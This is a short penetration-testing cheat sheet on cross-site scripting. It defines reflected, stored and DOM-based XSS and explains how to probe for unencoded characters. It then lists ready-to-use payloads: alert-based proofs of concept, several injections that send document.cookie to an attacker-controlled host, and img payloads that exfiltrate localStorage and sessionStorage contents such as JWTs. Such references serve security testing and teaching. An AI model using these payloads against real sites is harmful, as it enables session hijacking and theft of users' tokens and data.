# XSS

> Cross-site Scripting (XSS) is a client-side code injection attack. The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application.

```bash
#The famous test script:
<script>alert(1)</script>
```

### Types of XSS

* **Reflected:** The payload is included in the URL itself or in a POST parameter. It only affects people accessing the malicious link. Example: Search bars.
* **Stored:** Persistent XSS stored in a database. Every user who access the vulnerable page will receive the payload.
* **DOM Based:** Where content of an input is used to change something in the page (injecting in a client side script).

### Identifying XSS

To identify an XSS vulnerability, we send special characters to a web application in order to test how the application threats those characters. For example, the following characters in a comment section:

```bash
< > ; ""
```

If we inspect the results in the browser developer console and we see that these characters are not encoded, it's likely that the page is vulnerable to XSS. Confirm full injection with a PoC:

```
"><img src onerror=alert(1)> 
"autofocus onfocus=alert(1)// 
</script><script>alert(1)</script> 
'-alert(1)-' 
\'-alert(1)// 
Javascript:alert(1) 
```

### Stealing Cookies

If HttpOnly cookie flag is not set (it denies JavaScript from accessing cookies), we can modify the payload to hijack user cookies.

```
";new Image().src = "http://attacker.site/c.php?cc="+escape(document.cookie);//
x" onmouseover="new Image().src = 'http://attacker.site/c.php?cc='+escape(document.cookie);
x" onclick="new Image().src = 'http://attacker.site/c.php?cc='+escape(document.cookie);
";new Audio().src = "http://attacker.site/c.php?cc="+escape(document.cookie);//
<video src=x onerror="new Audio().src = 'http://attacker.site/c.php?cc='+escape(document.cookie);">
```

***

### Stealing SessionStorage or LocalStorage

Sometimes JWT tokens or other sensitive information is stored inside HTML5 SessionStorage/LocalStorage. These does not implement security mechanisms like "httpOnly", so we can extract its content easily:

```
<img src='http://attacker.site/data?d='+JSON.stringify(localStorage);'--!>
<img src='http://attacker.site/data?d='+JSON.stringify(sessionStorage);'--!>
```

### Evasion Techniques

The [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) documents common filter evasion tests.
